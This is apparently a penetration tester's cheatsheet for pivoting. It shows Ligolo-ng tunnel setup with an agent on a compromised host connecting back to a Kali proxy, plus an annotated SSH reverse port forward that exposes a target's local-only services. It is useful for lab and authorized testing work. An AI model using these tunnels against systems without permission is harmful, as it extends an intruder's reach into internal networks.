# Ligolo-ng Cheatsheet

1. On Proxy machine

```
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

# [*] Now run the Proxy binary

./proxy -selfcert
```

2. On agent machine

```
./agent.exe -connect <kali ip>:<port> -ignore-cert
```

3. Back to Proxy machine

In ligolo-ng cli

```
session <session number>
```

In another terminal

```
sudo ip route add <network>/24 dev ligolo
```

Back in ligolo-ng cli

```
start
```

## Listener

```
listener_add --addr 0.0.0.0:port --to 0.0.0.0:port
```

## Shutting down

Remove routing from routing table

```
sudo ip route del <network>/24 dev ligolo
```

Take interface down

```
sudo ip link set ligolo down
```

Remove interface

```
sudo ip link delete ligolo
```

# SSH Port Forwarding

```
SSH Port Forwarding / Tunneling Notes

Command example:
ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187

Breakdown:
ssh                  Start SSH connection
-f                   Send SSH to background after authentication
-N                   Do not run a remote command, only forward ports
-R                   Reverse port forward
8000:localhost:8000  Forward remote port 8000 to local localhost:8000
kali@192.168.45.187  SSH into Kali as user kali

Meaning:
From the target, connect back to Kali over SSH.
Open port 8000 on Kali.
Anything hitting Kali:8000 gets forwarded through SSH to target:localhost:8000.

So this:
ssh -f -N -R 8000:localhost:8000 kali@192.168.45.187

Means:
Kali 127.0.0.1:8000  -->  target 127.0.0.1:8000

Use case:
The target has a service only listening locally, e.g. 127.0.0.1:8000.
You cannot access it directly from Kali.
Use reverse port forwarding, then browse it from Kali:

curl http://127.0.0.1:8000
```

Local service with valid creds
```
ssh -L <LOCAL_PORT>:localhost:<REMOTE_PORT> user@<TARGET_IP>
```